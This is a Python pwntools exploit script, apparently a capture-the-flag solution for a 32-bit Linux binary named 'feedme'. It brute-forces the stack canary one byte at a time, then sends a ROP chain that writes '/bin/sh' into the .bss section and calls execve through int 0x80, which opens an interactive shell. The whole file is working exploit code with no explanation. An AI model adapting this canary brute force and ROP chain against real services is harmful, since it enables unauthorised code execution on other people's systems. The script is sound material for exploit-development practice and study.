'''
Author: Samrito
Date: 2022-01-17 19:44:00
LastEditors: Samrito
LastEditTime: 2022-01-18 19:33:11
'''

from asyncio.proactor_events import _ProactorSocketTransport
from urllib import response
from pwn import *

def debug(argv = ''):
    gdb.attach(io, argv)
    pause()

def breakCanary():
    knownCanary = b'\x00'
    forceLen = 0x22
    for i in range(3):
        for j in range(0, 0xff+1):
            payload = flat([b'@'*0x20, knownCanary, j.to_bytes(1,'little')])
            io.send(forceLen.to_bytes(1, 'little'))
            io.send(payload)

            response = io.recvuntil('exit.')
            if b'YUM' in response:
                knownCanary += j.to_bytes(1, 'little')
                forceLen += 1
                log.info('######## now we know' + hex(int.from_bytes(knownCanary, 'little')))
                break
    return knownCanary

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'debug'

io = process(argv=['./feedme'])
int80_addr = 0x08049761
bss_addr = 0x080eaf90
mov_eax_edx_addr = 0x0807be31 # mov dword ptr [eax], edx; ret;
pop_eax_addr = 0x080bb496 # pop eax; ret;
pop_edx_addr = 0x0806f34a # pop edx; ret;
pop_ecx_ebx_addr = 0x0806f371 # pop ecx; pop ebx; ret;



canary = breakCanary()
log.info(hex(int.from_bytes(canary, 'little')))

payload = flat([b'@'*0x20, canary, b'@'*(0xc)])
payload += flat([pop_eax_addr, bss_addr, pop_edx_addr, 0x6e69622f, mov_eax_edx_addr]) # write /bin
payload += flat([pop_eax_addr, bss_addr+0x4, pop_edx_addr, 0x68732f, mov_eax_edx_addr]) # write /sh
payload += flat([pop_ecx_ebx_addr, 0x0, bss_addr, pop_edx_addr, 0x0, pop_eax_addr, 0xb, int80_addr])

io.send(len(payload).to_bytes(1, 'little'))
io.send(payload)

io.interactive()
